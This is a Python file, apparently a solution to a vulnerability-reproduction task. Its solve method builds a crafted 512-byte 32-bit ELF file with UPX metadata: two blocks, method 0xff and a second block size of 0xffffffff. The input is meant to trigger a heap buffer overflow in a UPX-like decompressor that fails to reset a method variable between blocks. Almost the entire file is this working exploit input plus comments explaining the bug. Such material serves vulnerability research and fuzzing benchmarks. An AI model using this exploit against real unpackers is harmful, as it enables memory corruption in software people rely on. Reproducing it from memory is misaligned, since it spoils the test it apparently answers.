import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The PoC is a crafted 512-byte ELF file designed to trigger a heap
        # buffer overflow in a UPX-like decompressor. The vulnerability stems
        # from the decompressor's failure to reset a `method` variable between
        # processing multiple decompression blocks.

        # The PoC is structured to exploit this:
        # 1. A minimal 32-bit ELF header pointing to a single PT_LOAD segment
        #    that covers the entire file.
        # 2. At the end of the file, UPX-specific metadata is placed.
        # 3. This metadata defines two blocks (`l_nblock=2`).
        # 4. The `l_info` struct sets a non-standard decompression method (`l_method=0xff`).
        # 5. The first block (`b_info[0]`) is processed, which sets an internal
        #    `ph.method` variable based on `l_method`.
        # 6. The decompressor loops to the second block (`b_info[1]`). Due to the bug,
        #    `ph.method` is not reset.
        # 7. The second block has a huge uncompressed size (`b_usize=-1`). The stale
        #    `ph.method` value combined with this size causes a miscalculation of
        #    a write offset, leading to a write outside the allocated buffer.

        poc = bytearray(512)

        # ELF Header (52 bytes)
        # e_ident: 7f 45 4c 46 01 01 01 ... (ELF32, LSB, Version 1)
        poc[0:16] = b'\x7fELF\x01\x01\x01' + b'\x00' * 9
        # e_type: ET_DYN (Shared object file)
        struct.pack_into('<H', poc, 16, 3)
        # e_machine: EM_386
        struct.pack_into('<H', poc, 18, 3)
        # e_version: 1
        struct.pack_into('<I', poc, 20, 1)
        # e_entry: 0
        struct.pack_into('<I', poc, 24, 0)
        # e_phoff: 52 (program headers start right after this header)
        struct.pack_into('<I', poc, 28, 52)
        # e_shoff: 0
        struct.pack_into('<I', poc, 32, 0)
        # e_flags: 0
        struct.pack_into('<I', poc, 36, 0)
        # e_ehsize: 52
        struct.pack_into('<H', poc, 40, 52)
        # e_phentsize: 32
        struct.pack_into('<H', poc, 42, 32)
        # e_phnum: 1
        struct.pack_into('<H', poc, 44, 1)
        # e_shentsize, e_shnum, e_shstrndx are all 0
        poc[46:52] = b'\x00' * 6

        # Program Header (32 bytes), starting at offset 52
        ph_offset = 52
        # p_type: PT_LOAD
        struct.pack_into('<I', poc, ph_offset, 1)
        # p_offset, p_vaddr, p_paddr: 0
        poc[ph_offset + 4 : ph_offset + 16] = b'\x00' * 12
        # p_filesz: 512 (covers the whole file)
        struct.pack_into('<I', poc, ph_offset + 16, 512)
        # p_memsz: 512
        struct.pack_into('<I', poc, ph_offset + 20, 512)
        # p_flags: R+X (5)
        struct.pack_into('<I', poc, ph_offset + 24, 5)
        # p_align: 4096
        struct.pack_into('<I', poc, ph_offset + 28, 4096)
        
        # b_info array (16 bytes), describes the two blocks. Starts at offset 472
        b_info_offset = 472
        # Block 0: b_usize=65536, b_csize=1
        struct.pack_into('<II', poc, b_info_offset, 65536, 1)
        # Block 1: b_usize=0xffffffff, b_csize=0
        struct.pack_into('<II', poc, b_info_offset + 8, 0xffffffff, 0)

        # l_info struct (20 bytes), main UPX control struct. Starts at offset 488
        l_info_offset = 488
        # l_checksum
        struct.pack_into('<I', poc, l_info_offset, 0)
        # l_magic: "UPX!"
        poc[l_info_offset + 4:l_info_offset + 8] = b'UPX!'
        # l_version, l_format, l_method, l_level
        poc[l_info_offset + 8:l_info_offset + 12] = b'\x08\x02\xff\xff'
        # l_filesize (uncompressed size, not critical)
        struct.pack_into('<I', poc, l_info_offset + 12, 512)
        # l_nblock: 2 (triggers the loop)
        struct.pack_into('<I', poc, l_info_offset + 16, 2)

        # l_lsize trailer (4 bytes), at the very end. Starts at offset 508
        # Specifies the size of the l_info struct (20 bytes)
        struct.pack_into('<I', poc, 508, 20)

        return bytes(poc)